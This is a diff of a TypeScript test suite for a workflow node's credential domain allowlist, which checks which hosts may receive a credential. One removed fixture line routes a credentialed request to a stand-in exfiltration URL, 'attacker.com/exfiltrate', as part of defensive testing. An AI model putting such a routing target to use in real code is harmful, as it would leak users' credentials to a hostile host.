@@ -2531,11 +2531,16 @@ describe('RoutingNode', () => {
 			position: [0, 0],
 		};
 
-		const buildNodeType = (): INodeType => {
+		// `null` means the node declares no base URL; a default parameter cannot express that,
+		// since an explicit `undefined` triggers the default.
+		const buildNodeType = (
+			baseURL: string | null = 'https://api.example.com',
+			routedUrl = 'https://other-host.example.com/path',
+		): INodeType => {
 			const routingNodeType = nodeTypes.getByNameAndVersion(baseNode.type);
 			routingNodeType.description = {
 				credentials: [{ name: 'testCredential', required: true }],
-				requestDefaults: { baseURL: 'https://api.example.com' },
+				requestDefaults: { baseURL: baseURL ?? undefined },
 				properties: [
 					{
 						displayName: 'Endpoint',
@@ -2544,7 +2549,7 @@ describe('RoutingNode', () => {
 						default: '',
 						routing: {
 							request: {
-								url: 'https://attacker.com/exfiltrate',
+								url: routedUrl,
 							},
 						},
 					},
@@ -2553,9 +2558,12 @@ describe('RoutingNode', () => {
 			return routingNodeType;
 		};
 
-		const runWithCredential = async (data: Record<string, unknown>) => {
+		const runWithCredential = async (
+			data: Record<string, unknown>,
+			options: { baseURL?: string | null; routedUrl?: string } = {},
+		) => {
 			const credentialData = data as unknown as ICredentialDataDecryptedObject;
-			const nodeType = buildNodeType();
+			const nodeType = buildNodeType(options.baseURL, options.routedUrl);
 			const workflow = new Workflow({
 				nodes: [baseNode],
 				connections: {},
@@ -2628,6 +2636,50 @@ describe('RoutingNode', () => {
 			expect(requestOptions.allowedDomains).toBeUndefined();
 		});
 
+		test("adds the node's own host when mode is 'domains' and the list omits it", async () => {
+			const result = await runWithCredential({
+				apiKey: 'testApiKey',
+				allowedHttpRequestDomains: 'domains',
+				allowedDomains: 'other.example.com',
+			});
+
+			const requestOptions = (result?.[0]?.[0]?.json as { requestOptions: IHttpRequestOptions })
+				.requestOptions;
+			expect(requestOptions.allowedDomains).toBe('api.example.com, other.example.com');
+		});
+
+		test('uses the routed URL when the base URL resolves to an empty string', async () => {
+			const result = await runWithCredential(
+				{
+					apiKey: 'testApiKey',
+					allowedHttpRequestDomains: 'domains',
+					allowedDomains: 'other.example.com',
+				},
+				{ baseURL: '', routedUrl: 'https://s.jina.ai/' },
+			);
+
+			const requestOptions = (result?.[0]?.[0]?.json as { requestOptions: IHttpRequestOptions })
+				.requestOptions;
+			expect(requestOptions.allowedDomains).toBe('s.jina.ai, other.example.com');
+		});
+
+		test('uses the routed URL when the node declares no base URL', async () => {
+			// The JinaAI shape: `requestDefaults` carries headers only and operations route
+			// to absolute URLs.
+			const result = await runWithCredential(
+				{
+					apiKey: 'testApiKey',
+					allowedHttpRequestDomains: 'domains',
+					allowedDomains: 'other.example.com',
+				},
+				{ baseURL: null, routedUrl: 'https://s.jina.ai/' },
+			);
+
+			const requestOptions = (result?.[0]?.[0]?.json as { requestOptions: IHttpRequestOptions })
+				.requestOptions;
+			expect(requestOptions.allowedDomains).toBe('s.jina.ai, other.example.com');
+		});
+
 		test("does not block a declarative node when mode is 'none'", async () => {
 			const result = await runWithCredential({
 				apiKey: 'testApiKey',
@@ -2639,23 +2691,27 @@ describe('RoutingNode', () => {
 			expect(requestOptions.allowedDomains).toBeUndefined();
 		});
 
-		test("throws when mode is 'domains' but the list is empty", async () => {
-			await expect(
-				runWithCredential({
-					apiKey: 'testApiKey',
-					allowedHttpRequestDomains: 'domains',
-					allowedDomains: '   ',
-				}),
-			).rejects.toThrow('No allowed domains specified');
+		test("falls back to the node's own host when the 'domains' list is empty", async () => {
+			const result = await runWithCredential({
+				apiKey: 'testApiKey',
+				allowedHttpRequestDomains: 'domains',
+				allowedDomains: '   ',
+			});
+
+			const requestOptions = (result?.[0]?.[0]?.json as { requestOptions: IHttpRequestOptions })
+				.requestOptions;
+			expect(requestOptions.allowedDomains).toBe('api.example.com');
 		});
 
-		test("throws when mode is 'domains' but the list is missing", async () => {
-			await expect(
-				runWithCredential({
-					apiKey: 'testApiKey',
-					allowedHttpRequestDomains: 'domains',
-				}),
-			).rejects.toThrow('No allowed domains specified');
+		test("falls back to the node's own host when the 'domains' list is missing", async () => {
+			const result = await runWithCredential({
+				apiKey: 'testApiKey',
+				allowedHttpRequestDomains: 'domains',
+			});
+
+			const requestOptions = (result?.[0]?.[0]?.json as { requestOptions: IHttpRequestOptions })
+				.requestOptions;
+			expect(requestOptions.allowedDomains).toBe('api.example.com');
 		});
 
 		test('does not set allowedDomains when restriction field is absent', async () => {
